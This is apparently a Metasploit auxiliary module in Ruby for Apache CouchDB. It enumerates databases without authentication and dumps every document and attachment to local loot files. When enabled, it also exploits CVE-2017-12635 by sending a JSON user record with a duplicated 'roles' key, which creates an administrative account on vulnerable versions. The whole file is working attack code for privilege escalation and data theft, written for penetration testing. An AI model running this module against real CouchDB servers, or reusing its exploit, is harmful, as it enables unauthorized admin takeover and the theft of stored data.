##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Auxiliary
  include Msf::Exploit::Remote::HttpClient
  include Msf::Auxiliary::Report

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'CouchDB Enum Utility',
        'Description' => %q{
          This module enumerates databases on CouchDB using the REST API
          (without authentication by default).
        },
        'References' => [
          ['CVE', '2017-12635'],
          ['URL', 'https://justi.cz/security/2017/11/14/couchdb-rce-npm.html'],
          ['URL', 'https://wiki.apache.org/couchdb/HTTP_database_API']
        ],
        'Author' => [
          'Max Justicz', # Vulnerability discovery
          'Roberto Soares Espreto <robertoespreto[at]gmail.com>', # Metasploit module
          'Hendrik Van Belleghem', # (@hendrikvb) Database dump enhancements
          'Green-m <greenm.xxoo[at]gmail.com>' # Portions from apache_couchdb_cmd_exec.rb used
        ],
        'License' => MSF_LICENSE,
        'Notes' => {
          'Stability' => [CRASH_SAFE],
          'SideEffects' => [],
          'Reliability' => []
        }
      )
    )

    register_options(
      [
        Opt::RPORT(5984),
        OptString.new('TARGETURI', [true, 'Path to list all the databases', '/_all_dbs']),
        OptBool.new('SERVERINFO', [true, 'Print server info', false]),
        OptBool.new('CREATEUSER', [true, 'Create Administrative user', false]),
        OptString.new('HttpUsername', [true, 'CouchDB Username', Rex::Text.rand_text_alpha(12)]),
        OptString.new('HttpPassword', [true, 'CouchDB Password', Rex::Text.rand_text_alpha(12)]),
        OptString.new('ROLES', [true, 'CouchDB Roles', '_admin'])
      ]
    )
  end

  def valid_response(res)
    !res.nil? && res.code == 200 && res.headers['Server'].to_s.include?('CouchDB')
  end

  # TARGETURI identifies the list resource, not the root of the application.
  def couchdb_uri(*components)
    base_path = File.dirname(normalize_uri(target_uri.path).chomp('/'))
    components.empty? ? normalize_uri(base_path, '') : normalize_uri(base_path, *components)
  end

  def get_version
    @version = nil

    begin
      res = send_request_cgi(
        'uri' => couchdb_uri,
        'method' => 'GET'
      )
    rescue Rex::ConnectionError
      vprint_bad("#{peer} - Connection failed")
      return false
    end

    unless res
      vprint_bad("#{peer} - No response, check if it is CouchDB.")
      return false
    end

    if res.code == 401
      print_bad("#{peer} - Authentication required.")
      return false
    end

    unless res.code == 200
      vprint_bad("#{peer} - Unexpected HTTP status #{res.code}, does not appear to be CouchDB.")
      return false
    end

    res_json = res.get_json_document

    unless res_json.is_a?(Hash) && res_json.key?('couchdb')
      vprint_bad("#{peer} - Response does not appear to be from CouchDB.")
      return false
    end

    @version = res_json['version']
    unless @version
      vprint_warning("#{peer} - CouchDB detected but version not found in response.")
      return false
    end

    true
  end

  def check
    return Exploit::CheckCode::Unknown('Failed to retrieve CouchDB version') unless get_version

    version = Rex::Version.new(@version)
    return Exploit::CheckCode::Unknown('CouchDB version string is empty') if version.version.empty?

    vprint_good("#{peer} - Found CouchDB version #{version}")

    return Exploit::CheckCode::Appears("CouchDB version #{version} is in the vulnerable range") if version < Rex::Version.new('1.7.0') || version.between?(Rex::Version.new('2.0.0'), Rex::Version.new('2.1.0'))

    Exploit::CheckCode::Safe('CouchDB version is not in the vulnerable range')
  end

  def get_dbs(auth)
    res = send_request_cgi(
      'uri' => normalize_uri(target_uri.path),
      'method' => 'GET',
      'authorization' => auth
    )

    unless res
      print_error('Failed to list databases: Target did not respond')
      return
    end

    unless valid_response(res)
      print_error("Failed to list databases: Unexpected HTTP status #{res.code} or server identity")
      return
    end

    databases = res.get_json_document
    unless databases.is_a?(Array) && databases.all? { |database| database.is_a?(String) }
      print_error('Failed to parse database list: Unexpected JSON response')
      return
    end

    print_status("#{peer} - Enumerating Databases...")
    results = JSON.pretty_generate(databases)
    print_good("#{peer} - Databases:\n\n#{results}\n")
    path = store_loot(
      'couchdb.enum',
      'application/json',
      rhost,
      results,
      'CouchDB Databases'
    )

    print_good("#{peer} - File saved in: #{path}")
    databases.each do |db|
      response = send_request_cgi(
        'uri' => couchdb_uri(db, '_all_docs'),
        'method' => 'GET',
        'authorization' => auth,
        'vars_get' => { 'include_docs' => 'true', 'attachments' => 'true' }
      )

      unless response
        print_error("Failed to retrieve database #{db}: Target did not respond")
        break
      end

      unless valid_response(response)
        print_error("Failed to retrieve database #{db}: Unexpected HTTP status #{response.code} or server identity")
        break
      end

      documents = response.get_json_document
      unless documents.is_a?(Hash) && documents['rows'].is_a?(Array) && documents['total_rows'].is_a?(Integer)
        print_error("Failed to parse document response for #{db}: Unexpected JSON response")
        break
      end

      results = JSON.pretty_generate(documents)
      path = store_loot(
        "couchdb.#{db}",
        'application/json',
        rhost,
        results,
        'CouchDB Databases'
      )
      print_good("#{peer} - #{db} saved in: #{path}")
    end
  rescue ::Rex::ConnectionError => e
    elog('CouchDB database enumeration failed', error: e)
    print_error("Failed to enumerate databases: #{e.class}")
  end

  def get_server_info(auth)
    res = send_request_cgi(
      'uri' => couchdb_uri,
      'method' => 'GET',
      'authorization' => auth
    )

    unless res
      print_error('Failed to retrieve server information: Target did not respond')
      return
    end

    unless valid_response(res)
      print_error("Failed to retrieve server information: Unexpected HTTP status #{res.code} or server identity")
      return
    end

    server_info = res.get_json_document
    unless server_info.is_a?(Hash) && server_info.key?('couchdb')
      print_error('Failed to parse server information: Unexpected JSON response')
      return
    end

    print_good("#{peer} - #{JSON.pretty_generate(server_info)}")
    report_service(
      host: rhost,
      port: rport,
      name: 'couchdb',
      proto: 'tcp',
      info: res.body
    )
  rescue ::Rex::ConnectionError => e
    elog('CouchDB server information retrieval failed', error: e)
    print_error("Failed to retrieve server information: #{e.class}")
  end

  def create_user
    username = datastore['HttpUsername']
    password = datastore['HttpPassword']
    roles = datastore['ROLES']
    timeout = datastore['TIMEOUT']

    data = %({
"type": "user",
"name": "#{username}",
"roles": ["#{roles}"],
"roles": [],
"password": "#{password}"
})
    res = send_request_cgi(
      {
        'uri' => "/_users/org.couchdb.user:#{username}", # http://hostname:port/_users/org.couchdb.user:username
        'method' => 'PUT',
        'ctype' => 'text/json',
        'data' => data
      }, timeout
    )

    unless res && res.code == 200
      print_error("#{peer} - Change Failed")
      return
    end

    print_good("#{peer} - User #{username} created with password #{password}. Connect to #{full_uri('/_utils/')} to login.")
  end

  def run
    username = datastore['HttpUsername']
    password = datastore['HttpPassword']

    if datastore['CREATEUSER']
      fail_with(Failure::Unknown, 'get_version failed in run') unless get_version
      version = Rex::Version.new(@version)
      print_good("#{peer} - Found CouchDB version #{version}")
      create_user if version < Rex::Version.new('1.7.0') || version.between?(Rex::Version.new('2.0.0'), Rex::Version.new('2.1.0'))
    end

    # Generated defaults are reserved for CREATEUSER; ordinary enumeration
    # stays anonymous unless the operator supplied credentials.
    credentials_supplied = !datastore.default?('HttpUsername') || !datastore.default?('HttpPassword')
    auth = basic_auth(username, password) if username && password && (datastore['CREATEUSER'] || credentials_supplied)
    get_server_info(auth) if datastore['SERVERINFO']
    get_dbs(auth)
  end
end
